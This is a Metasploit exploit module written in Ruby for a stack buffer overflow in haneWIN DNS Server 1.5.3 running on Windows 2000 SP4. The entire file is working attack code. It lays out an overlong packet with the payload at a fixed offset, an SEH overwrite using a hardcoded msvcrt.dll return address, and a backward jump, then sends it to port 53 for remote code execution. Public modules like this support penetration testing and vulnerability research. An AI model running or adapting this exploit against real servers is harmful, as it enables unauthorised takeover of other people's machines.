require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'		=> 'haneWIN DNS Server Buffer Overflow',
			'Description'	=> %q{
				This module exploits a buffer overflow vulnerability found in
				haneWIN DNS Server <= 1.5.3. The vulnerability is triggered
				by sending an overly long packet to the victim server. A memcpy
				function blindly copies user supplied data to a fixed size buffer
				leading to remote code execution. 

				This module was tested against haneWIN DNS 1.5.3
			},
			'Author' => [ 'james fitts' ],
			'License' => MSF_LICENSE,
			'References' =>
				[
					[ 'EDB', '31260' ],
					[ 'OSVDB', '102773' ]
				],
			'Privileged'  => false,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload' =>
				{
					'Space'	=> 1000,
					'DisableNops' => true,
					'BadChars' => "\x00\x0a\x0d\x20",
					'PrependEncoder' => "\x81\xc4\x54\xf2\xff\xff" # Stack adjustment # add esp, -3500
				},
			'Platform' => 'win',
			'DefaultTarget'	=> 0,
			'Targets' =>
				[
					[
						'Windows 2000 SP4 EN / haneWIN DNS 1.5.3',
						{
							# msvcrt.dll v6.10.9844.0
							# pop esi/ pop edi/ retn
							'Ret' => 0x78010394,
						}
					]
				],
			'DisclosureDate' => 'Jul 27 2013'))

			register_options([Opt::RPORT(53)], self.class)
	end

	def exploit
		connect

		p = make_nops(32) + payload.encoded

		buf = Rex::Text.pattern_create(5000)
		buf[0, 2] = [0x4e20].pack('n')							# length for malloc
		buf[1332, p.length] = p
		buf[2324, 8] = generate_seh_record(target.ret)
		buf[2332, 15] = make_nops(10) + "\xe9\x13\xfc\xff\xff"	# jmp $-1000 

		print_status("Sending malicious request...")
		sock.put(buf)
		disconnect

	end
end